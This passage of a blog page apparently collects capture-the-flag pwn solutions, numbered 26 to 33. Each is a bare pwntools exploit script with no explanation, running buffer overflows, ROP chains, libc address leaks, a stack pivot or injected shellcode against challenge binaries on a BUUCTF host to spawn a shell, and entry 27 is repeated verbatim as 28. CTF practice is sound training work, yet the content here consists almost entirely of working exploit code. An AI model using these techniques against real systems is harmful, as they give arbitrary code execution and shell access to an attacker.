class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-26-jarvisoj-level2-x64-solve"><a href="#NO-26-jarvisoj-level2-x64-solve" class="headerlink" title="NO.26 jarvisoj_level2_x64_solve"></a>NO.26 jarvisoj_level2_x64_solve</h1><h3 id="exp-26"><a href="#exp-26" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level2_x64&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">27721</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x00000000004006b3</span></span><br><span class="line">system_addr = <span class="number">0x040063E</span></span><br><span class="line"></span><br><span class="line">system_addr1 = <span class="number">0x004004C0</span></span><br><span class="line">binsh_addr = <span class="number">0x0600A90</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x80</span>+<span class="number">8</span>)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-27-HarekazeCTF2019-baby-rop2-solve"><a href="#NO-27-HarekazeCTF2019-baby-rop2-solve" class="headerlink" title="NO.27 [HarekazeCTF2019]baby_rop2_solve"></a>NO.27 [HarekazeCTF2019]baby_rop2_solve</h1><h3 id="exp-27"><a href="#exp-27" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[HarekazeCTF2019]baby_rop2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29812</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[HarekazeCTF2019]baby_rop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">format_str=<span class="number">0x400770</span>  <span class="comment">#%s</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>) +p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;? &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line"><span class="string">offset = read_addr - libc.dump(&#x27;read&#x27;)</span></span><br><span class="line"><span class="string">system = offset + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">binsh = offset + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">offset = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + offset</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;? &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-28-HarekazeCTF2019-baby-rop2-solve"><a href="#NO-28-HarekazeCTF2019-baby-rop2-solve" class="headerlink" title="NO.28 HarekazeCTF2019_baby_rop2_solve"></a>NO.28 HarekazeCTF2019_baby_rop2_solve</h1><h3 id="exp-28"><a href="#exp-28" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./[HarekazeCTF2019]baby_rop2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29812</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;[HarekazeCTF2019]baby_rop2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">format_str=<span class="number">0x400770</span>  <span class="comment">#%s</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400733</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x0000000000400731</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>) +p64(pop_rdi)+p64(read_got)+p64(printf_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;? &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(read_addr)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc = LibcSearcher(&#x27;read&#x27;,read_addr)</span></span><br><span class="line"><span class="string">offset = read_addr - libc.dump(&#x27;read&#x27;)</span></span><br><span class="line"><span class="string">system = offset + libc.dump(&#x27;system&#x27;)</span></span><br><span class="line"><span class="string">binsh = offset + libc.dump(&#x27;str_bin_sh&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">offset = read_addr - libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>] + offset</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x28</span>)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;? &#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-29-ciscn-2019-ne-5-solve"><a href="#NO-29-ciscn-2019-ne-5-solve" class="headerlink" title="NO.29 ciscn_2019_ne_5_solve"></a>NO.29 ciscn_2019_ne_5_solve</h1><h3 id="exp-29"><a href="#exp-29" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">25921</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_ne_5&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh_addr = <span class="number">0x080482EA</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0xdeadbeef</span>)+p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Please input admin password:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;administrator&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0.Exit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0.Exit\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-30-pwn2-sctf-2016-solve"><a href="#NO-30-pwn2-sctf-2016-solve" class="headerlink" title="NO.30 pwn2_sctf_2016_solve"></a>NO.30 pwn2_sctf_2016_solve</h1><h3 id="exp-30"><a href="#exp-30" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./pwn2_sctf_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26427</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn2_sctf_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc/ubuntu16/32/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">format_addr = <span class="number">0x080486F8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;How many bytes do you want me to read? &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;data!\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(printf_plt)+p32(main_addr)+p32(format_addr)+p32(atoi_got)</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;You said: &#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;You said: &#x27;</span>)</span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">offset =  atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]+offset</span><br><span class="line">binsh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()+offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x2c</span>+<span class="number">4</span>)+p32(system)+p32(<span class="number">0xdeefdedf</span>)+p32(binsh)</span><br><span class="line">send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-31-ez-pz-hackover-2016-solve"><a href="#NO-31-ez-pz-hackover-2016-solve" class="headerlink" title="NO.31 ez_pz_hackover_2016_solve"></a>NO.31 ez_pz_hackover_2016_solve</h1><h3 id="exp-31"><a href="#exp-31" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ez_pz_hackover_2016&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29304</span>)</span><br><span class="line"><span class="comment">#elf = ELF(&#x27;ez_pz_hackover_2016&#x27;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(p.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(hex(s_addr))</span></span><br><span class="line">payload = <span class="string">&#x27;crashme\x00&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">26</span>-<span class="number">8</span>)+p32(s_addr-<span class="number">0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-32-ciscn-2019-es-2-solve"><a href="#NO-32-ciscn-2019-es-2-solve" class="headerlink" title="NO.32 ciscn_2019_es_2_solve"></a>NO.32 ciscn_2019_es_2_solve</h1><h3 id="exp-32"><a href="#exp-32" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26426</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08048595</span></span><br><span class="line">hack = <span class="number">0x0804854B</span></span><br><span class="line">leave = <span class="number">0x080484B8</span></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x27</span>,<span class="string">&#x27;a&#x27;</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(<span class="number">0x2f</span>)</span><br><span class="line">ebp_addr = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x38</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;ebd_addr =&gt;&quot;</span> , <span class="built_in">hex</span>(ebp_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;bbbb&#x27;</span>+ p32(system_plt) +<span class="string">&#x27;cccc&#x27;</span>+p32(ebp_addr+<span class="number">0x10</span>)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr)+p32(leave)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-33-jarvisoj-level3-solve"><a href="#NO-33-jarvisoj-level3-solve" class="headerlink" title="NO.33 jarvisoj_level3_solve"></a>NO.33 jarvisoj_level3_solve</h1><h3 id="exp-33"><a href="#exp-33" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8-*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./jarvisoj_level3&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28355</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;jarvisoj_level3&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(write_plt)+p32(main)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#print hex(len(payload))</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#print hex(write_addr)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">offset = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system = libc.dump(<span class="string">&#x27;system&#x27;</span>) + offset</span><br><span class="line">binsh = libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) + offset</span><br><span class="line">payload  = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>)+p32(system)+p32(main)+p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="NO-34-BJDCTF2nd-ydsneedgirlfriend2-solve"><a 